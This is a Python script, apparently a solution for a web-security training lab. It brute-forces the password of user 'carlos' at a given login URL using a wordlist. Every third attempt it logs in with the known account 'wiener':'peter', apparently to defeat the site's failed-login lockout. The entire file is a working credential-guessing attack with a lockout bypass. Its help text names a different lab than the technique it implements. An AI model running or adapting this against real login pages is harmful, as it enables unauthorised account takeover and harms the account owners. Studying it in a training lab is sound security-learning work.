import requests
import sys
import os
import getopt


def clear_screen():
  if os.name == 'posix':
    os.system('clear')
  else:
    os.system('cls')


def get_password(url, session):
  username = "carlos"
  number = 0
  passwords = open("./passwords.txt", "r")

  for password in passwords:
    password = password.strip()
    
    if (number % 3 == 0) :
      data = {'username': "wiener", 'password':  "peter"}
      number += 1
      response = session.post(url, data=data)
    else:
      data = {'username': username, 'password':  password}
      number += 1
      response = session.post(url, data=data)
      clear_screen()
      print(f"[!] Testing password \"{password}\"")

      if "Incorrect password" not in response.text:
        valid_password = password
        passwords.close()
        return valid_password


def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print("This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login")
      print("\x1b[?25h")
      sys.exit()

  session = requests.Session()
  password = get_password(url, session)
  clear_screen()
  
  print(f"[*] The username is: \"carlos\"\n[*] The password is: \"{password}\"")


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()